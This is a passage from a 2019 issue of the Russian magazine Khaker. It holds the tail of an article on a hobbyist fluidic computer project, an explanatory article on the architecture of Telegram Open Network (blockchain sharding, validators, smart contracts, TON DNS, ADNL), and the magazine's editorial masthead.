тер‐копии и отливать или штамповать элементы пачками. Но в альбоме есть
и другие элементы — мно говходовые ИЛИ, И, И‐НЕ, исключающее ИЛИ и
другие. Но начать нужно с чего‐то простого.


FluidicPC Challenge
В настоящий момент в железе практичес ки ничего нет, но пос тепенно мы
с товарищем изготавливаем лабора торное оборудование и набор вся ких
полезных частей и расходников: дым‐машину, компрессор, регуля торы, кра‐
ники, шланги, штуцеры. Требуется доведение до ума фрезера, с помощью
которого мы создаем самые пер вые элементы. И, конечно, многие вопросы
пока открыты.
 • Какова архитектура будущей машины? Будет ли это уже ставшая клас‐
   сической архитектура BrainfuckPC — или же пойти новым, особенным
   путем? Почему бы, например, не создать простой модуль с элементом
   XOR, парой триггеров и вентилей, отлить тысячу таких модулей и собрать
   из них сверхточ ную нейросеть?
 • Как вводить данные в компь ютер? Самый простой вариант — клавиатура
   органного типа с клапана ми под каж дой клавишей. Но это в том случае,
   если архитектура — классическая.
 • Как выводить данные из машины? По сути, из некоторых выходов либо
   будет идти воздух, либо нет.
 • Хочется, чтобы ЭВМ управляла чем‐то. Но с реальными предположениями
   пока туговато.


ЗАКЛЮЧЕНИЕ
Впереди много интерес ной работы на радость себе и потеху дру гим, и я
всегда открыт новым идеям, предложениям и подходящим железякам. Если
хочешь наблюдать за процессом, подпишись на мой канал на YouTube и сле‐
ди за обновлением опи санных проектов и дру гими работами.


        WWW

                     •Канал на YouTube
                       •Лайв‐канал
                     •Канал проекта в Telegram
                     •Репозиторий

                      Страницы проектов на hackaday.io: BrainfuckPC,
                          FluidicPC, DekatronPC.
 GEEK

ТОННА ВСЕГО





     КАК РАБОТАЕТ TON И ПОЧЕМУ ЭТО
         НЕ ПРОСТО БЛОКЧЕЙН





 Ты наверняка уже слышал про TON — про‐
 ект  Павла  Дурова  и  разработчиков
 Telegram, связанный с блокчейном, крип‐
 товалютами и децентра лиза цией. В этой
 статье я расскажу о том, что нас ждет,          Sergey Chernikov                                                                                             schernikov@protonmail.com
 и почему TON — не просто очередной
 блокчейн.


 Очень долго в разговорах не было конкретики: Дуров ничего не объявлял
 официально, а разные источники рас ходились во мнениях о том, что же такое
 TON. Первые достоверные новос ти появились в феврале 2018 года, когда
 Павел Дуров зарегис трировал компании TON  Issuer и  Telegram Group
  в Комиссии по ценным бумагам и биржам США (SEC). За два раунда зак‐
 рытого ICO команде удалось привлечь инвестиции в размере 1,7 миллиарда
 долларов.
   И хотя никаких публичных заявлений Дуров не делал, работа над проектом
 идет вовсю. Документация и код TON доступны всем желающим по адре су
  test.ton.org, а на GitHub появилась орга низа ция ton‐blockchain, которая опуб‐
 ликовала исходный код TON Blockchain Software.


              INFO

                        Эта статья основана на текущей версии white pa‐
                           per   (PDF)  и  доступном  коде  по  состоянию
                        на момент подготовки  (см. дату публикации).
                     TON — проект, который находится в активной раз‐
                         работке; прямо сейчас запущена только тестовая
                            сеть. У меня нет информации о том, какие изме‐
                        нения будут внесены в этот проект.



 ЧТО ТАКОЕ TON?
 TON расшифровывается как Telegram Open Network. В первую очередь
  это платформа, одним из клю чевых компонентов которой является TON
  Blockchain. Сам по себе TON блокчейном не является — скорее это децен‐
  трализованный суперкомпь ютер, в основе которого лежит блокчейн. В TON
  входят сле дующие компоненты.
  • TON Blockchain — ключевой компонент TON, о котором мы поговорим
    ниже.
  • TON Network — сетевой уро вень, который используется для коммуника‐
     ции. Все остальные компоненты системы так или иначе используют TON
    Network для обще ния.
  • TON DHT — распределенная хеш‐таблица, похожая на Kademlia. Очень
    важный компонент платформы: используется в TON Storage (для поиска
     нод, которые имеют тот или иной файл), TON Proxy и других сервисах.
  • TON Storage — децентра лизованное хра нение файлов, независимое
    от блокчейна. TON Blockchain вместе с TON DHT предоставля ют «дос туп»
     к файлам, в то время как сами файлы могут находиться где угодно. Похоже
    на то, как сейчас работают торренты.
  • TON Proxy — прокси. Да, это просто возможность общаться не нап‐
    рямую, а через посредников, которые готовы предоставить свои узлы
    для этих целей. Похоже на то, как сейчас работает I2P.
  • TON Services — плат форма для сервисов. В качестве примера я расска‐
    жу о создании «сайта в TON».
  • TON DNS — о нем мы тоже поговорим чуть поз же.
  • TON Payments — плат форма для (микро)платежей.


 TON BLOCKCHAIN
 Это ключевой компонент TON. Он представляет собой не просто блокчейн,
 а коллекцию разных блокчейнов.
  • Masterchain — самый главный блокчейн, классичес кая цепочка блоков,
    содержит параметры системы, сос тояние воркчейнов и их шардов (про
    них ниже), хеши всех пос ледних блоков, количество выпущенных Gram
    и прочую важную информа цию. В общем, все самое необходимое
    для функционирования системы.
  •                                                        32    Workchain — объединяет шарды. Всего может быть 2   таких воркчей‐
     нов, каждый из которых имеет уникальный идентификатор и свою логику.
    Каждый воркчейн, например, может иметь свою виртуальную машину,
    свои форматы адресов. То есть теоретически можно создать воркчейн
    для процессинга смарт‐контрактов из Ethereum. Первый воркчейн будет
    иметь префикс 0 — он зарезервирован для основного воркчейна TON.
  • Shardchain (далее — шард) — главная часть мас штабирования. В рамках
                                    60    одного воркчейна может быть 2  шардов. Шарды могут «общаться» друг
    с другом, каждый шард отвечает за определен ные аккаунты и подчиняется
    всем правилам своего воркчейна.
  • Accountchain — можно ска зать, что это учет ная книга (ledger) для вхо‐
    дящих и исходящих сообщений определен ного аккаунта.

 Все это было придумано для решения двух острых проблем. Первая проб‐
 лема — размер блок чейна, который непрерывно растет и в случае с Bitcoin
  в 2019 году перевалил за 200 Гбайт. Большинство криптовалют тре буют хра‐
  нить и синхронизировать весь блокчейн, и это становится все более накладно
 с ростом сети. Вторая проблема заключается в том, что для внесения серь‐
 езных инфраструктурных изменений час то требуется «пересоздать» блок‐
  чейн, то есть сде лать форк.
   TON решает первую проблему с помощью Inﬁnite Sharding Program, как она
 называется в документе. Чтобы объяснить, как это работает, лучше зайти
 издалека. Начнем с того, что workchain — это на самом деле виртуальный
 блокчейн, объединяющий нес колько шардов. Идентификатор воркчейна
  является частью идентифика тора конкретного шарда, благодаря которому
 можно понять, к какому воркчейну относится тот или иной шард.
    Создать воркчейн может каж дый, кто готов оплатить высокую стоимость
  транзакции в мастерчейне и опубликовать спецификацию и «правила» нового
 воркчейна. Тем не менее требуется консенсус двух тре тей текущих валида‐
  торов, так как им придется обновить ПО для работы с блоками нового вор‐
  кчейна.
    Каждый  шард  имеет  следующий  идентификатор  в  виде  кортежа:
 workchain_id и префикс самого шарда. Префикс отве чает за те аккаунты
  (адреса), которые будут включены в шард. Нап ример, если префикс 1337, то
 все адреса, которые начинаются с 1337, будут в этом шарде. Пре фикс может
 динамически меняться и иметь длину от 0 до 60 бит. Сделано это для того,
  чтобы склеивать шарды без нагрузки и раз делять наг руженные шарды.
    Accountchain — еще один виртуальный блокчейн, который имеет иден‐
 тификатор в виде кор тежа: workchain_id и идентификатор самого аккаунта.


 МАЙНИНГ
 Вместо привыч ного перебора хешей на видеокартах в TON используется
 одна из вариаций PoS‐алго ритма, которая решает проблему византийских
 генералов (далее — BFT): в результате для консенсу са тре буется две трети
 валидаторов.
   Новые блоки создаются и проверя ются валида торами. Любой может стать
 валидатором, если он готов заложить много GRM в мастерчейн, подтвердив
 таким образом свои намерения. Такой «залог» замораживается минимум
 на месяц. На данный момент для того, чтобы стать валидатором в тес товой
  сети, нужно 100 000 GRM (тестовых, конечно же).
    Валидаторы распределяются меж ду всеми существующими шардами
  в случайном порядке. Примерно каж дые 1024 блока валидаторы меняют
 шард, в котором они «работают». В рамках одного шарда валидаторы
 выбирают новый блок (бла года ря BFT). Если консенсус был дос тигнут, то
 формируется новый блок, комиссии с транзакций и эмис сия в этом блоке
 распределяются между валидатора ми. Один и тот же валидатор может
 валидировать несколько шардов — подразумевается, что он будет проделы‐
  вать эту работу параллельно.
    Если валидатор выбрал «неверный блок», то он может быть оштрафован
 на всю сумму или часть его залога. Валидатора также могут отстранить
  от работы на какое‐то время. Ког да все шарды сформировали новые блоки
  (или после тайм‐аута, предположительно, в пять секунд), генерируется блок
 для мастерчейна, который содержит хеши всех новых блоков в шардах.
 В свою оче редь, этот блок формируется благода ря консенсу су всех валида‐
 торов в системе.


 ИСПРАВЛЕНИЕ ОШИБОК
 Я посвящаю исправлению ошибок отдельный параграф, так как это очень
  интересный вопрос в мире блокчейна (вспомни ис торию The DAO и Ethereum
  Classic) и меня очень много о нем спрашива ли на последнем выступле нии
 про TON.
    Конечно, ошибок быть не должно, так как для консенсуса требуется две
  трети валидаторов, но в системе заложено обна ружение и исправление «неп‐
 равильных» блоков. Предположим, что был обна ружен «неправильный» блок,
 и валидаторов, которые подписали этот блок, наказали. Но сис тема все
 еще имеет неправильный блок — так что этих мер недостаточно.
   В большинстве других систем для этого требуется форк с последне го
 «правильного» блока. Такой подход имеет множество недостатков: его слож‐
 но реализовать, нужно убедить всех учас тни ков перейти на новую сеть после
 форка; и не менее остро стоит вопрос о том, что делать с правильными тран‐
  закциями, которые были совершены уже после «неправильного» блока.
   TON Blockchain решает эту проб лему следующим образом. Каждый блок
  в шарде (и в мастерчейне тоже) является блокчейном, который по умол чанию
 состоит из одно го блока. Если требуется исправить «неверный» блок, то этот
 маленький блокчейн вырастает еще на один блок, который и заменя ет пре‐
 дыдущий. Этот блок также генерируется валидаторами, которые в данный
 момент работают в шарде.
    При этом отдельно упо мина ется, что блоки в виртуальном accountchain
 не будут изменены, если они были пра вильными. Подразуме вается, что
  в новом блоке будут исправлены только «неверные» транзакции, но это
 не затронет правильные.


 CМАРТ-КОНТРАКТЫ
 Смарт‐контракты в TON поз воляют написать биз нес‐логику, которая будет
 выпол няться децентрализованно. Контракты пол ноценные по Тьюрингу, и их
 предлагается писать на языке Fift. Fift — новый язык программирования, соз‐
 данный специально для TON; он имеет определенные сходс тва с Forth.
    Для выполнения смарт‐контрактов была написа на виртуальная машина —
 TON VM (Ton Virtual Machine). Но не стоит забывать, что воркчейн вместе
 с другими опре деляющими параметрами может иметь собственную вир‐
  туальную машину и собс твенный язык для смарт‐контрактов. Именно поэтому
  я не буду заострять вни мание на Fift и TON VM в этой статье.


         WWW

                      Подробности о Fift и TON VM можешь почерпнуть
                         в документации проекта.
                       Ознакомиться с азами Forth или просто пос‐
                          мотреть, как выглядит код на нем, тебе поможет
                           статья «Загадочный Forth. Знакомимся с одним
                         из   важнейших   языков   программирова ния,
                        о котором мало кто знает».


 Смарт‐контракты в TON используются повсеместно: в TON Storage, TON DNS
 и других сервисах. Для валида ции бло ков и консенсу са тоже используются
 смарт‐контракты. Как ты уже понял, TON — платформа очень самодос таточ‐
 ная и совершенно не зависит от внешних факторов. Стоит еще упомянуть, что
 каждый аккаунт формально может являться смарт‐контрактом.
    Замечу на полях, что компания TON Labs готовит компиляторы для других
 языков программирования,  чтобы писать смарт‐контракты можно было
 не только на  Fift. Компиляторы для C и  Solidity уже можно посмотреть
 на ton.dev.


 TON DNS
 TON DNS — один из сервисов TON. Используется для пре образования понят‐
 ных человеку идентификаторов (доменные имена, адре са) в адреса ADNL
 и адреса TON Blockchain.
    Использовать TON DNS можно, например, для передачи денег по иден‐
 тификатору вместо адреса кошелька. Это сильно упрощает дело, потому что
 теперь можно перевести сумму на понятный адрес или имя пользователя.
  Также идентификатор можно перенаправить на смарт‐контракт — например,
 выставляем счет на оплату в каком‐то магазине, а после перевода контракт
 обработает платеж.
   Сам TON DNS реализован в виде нескольких специальных смарт‐контрак‐
  тов. Эти смарт‐контракты представляют собой древовидную структуру. Каж‐
 дый из них отвечает за регистрацию поддоменов для определенной зоны
 или домена. Корневой контракт, который обслу жива ет домены первого уров‐
 ня сети TON, находится в мастерчейне.
    Регистрация нового домена (идентифика тора) реализуется через отправ‐
  ку сообщения в смарт‐контракт, который отвечает за желаемый поддомен.
 Это стоит определен ной суммы (как и все переда ваемые сообщения); ука‐
 зываются ключ, владелец, сроки регистра ции. Идентификаторы регистри‐
 руются в порядке очереди — кто успел, того и тапки.
    Опуская совсем низкоуровневые детали, можно резюмировать, что TON
 DNS имеет более широкое применение, чем DNS в привычном понимании
  этого слова. Учитывая возможности TON Blockchain, ADNL и смарт‐контрак‐
  тов, за идентификатором может скрывать ся как обычный кошелек, так и пол‐
 ноценный сервис с бизнес‐логикой.


 ADNL
 ADNL — собственный протокол, основной для TON. Это протокол, который
 используется на самом низком уровне. Главное его преиму щество — не нуж‐
 но беспокоиться об адресах IPv4/IPv6, портах и т.д.: они все скрыты абстрак‐
 тным сетевым уровнем. Для обмена данными используются 256‐битные
 сетевые адреса  (названные «абстрактны ми сетевыми адресами»). Если
  говорить простым языком, это ана лог SSL по UDP. Чтобы принимать и рас‐
 шифровывать сооб щения, предназна ченные для определенного адреса,
 необходимо иметь его приватный ключ. Для того, чтобы отправить сооб‐
 щение, необходимо (помимо адреса) знать публичный ключ получателя.
   С точки зрения большинства компонентов TON, существу ет только ADNL,
 с помощью которого можно отправлять сооб щения с одного адреса на дру‐
  гой. В текущем white paper ска зано, что ADNL будет реализован через UDP
 с опциональным откатом до TCP, если UDP будет недос тупен. Еще в докумен‐
  те упоминается RLDP (Reliable Large Datagram Protocol) как похожий на TCP
 протокол более высокого уровня.


 CАЙТ В СЕТИ TON
 Теперь, когда мы знаем про ADNL и TON DNS, можно поговорить о том,
  как может выглядеть соз дание сайта в TON. Такой сайт будет децентрализо‐
 ванно хоститься в TON Network. Сер висы, которые пол ностью находятся
  в TON Network, называются ton‐services.
   В качестве примера white paper описывает создание сервиса, который
 принимает запросы HTTP через RLDP. Чтобы реализовать его, нужен обычный
 браузер и прокси‐сервер, который будет переводить запросы HTTP в TON
  Network. Общаясь по про токолу RLDP, сервис может отвечать на запросы,
 а прокси‐сервер будет воз вра щать их клиенту в привычном формате.
    Стоит упомянуть, что на этом этапе мож но использовать TON DNS
 для «коротких» адресов. Это поз воляет вос создать при вычный порядок
 вещей. В будущем мы можем увидеть какой‐нибудь TON Browser, аналогич‐
 ный браузе ру для сети Tor.


 ЗАКЛЮЧЕНИЕ
 Как видишь, описать TON в двух сло вах непросто. Это большая и сложная
 система, которая состоит из раз ных низкоуровневых компонентов, и блок‐
 чейн TON — только один из них. Но TON при этом — это не только блокчейн.
    Уже в этом году мы, воз можно, будем наблюдать запуск полноценной
  сети. Скорее всего, некото рые компоненты платформы из тех, что описаны
  в этой статье, будут доступны позже других.
   Однако уже сейчас можно испытать клиент и сеть на тестовой ноде. Если
 тебе инте ресна эта тема и тянет на эксперименты, можешь заглянуть
  в blockchain explorer или даже соб рать клиент и ноду.
   №09 (246)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2019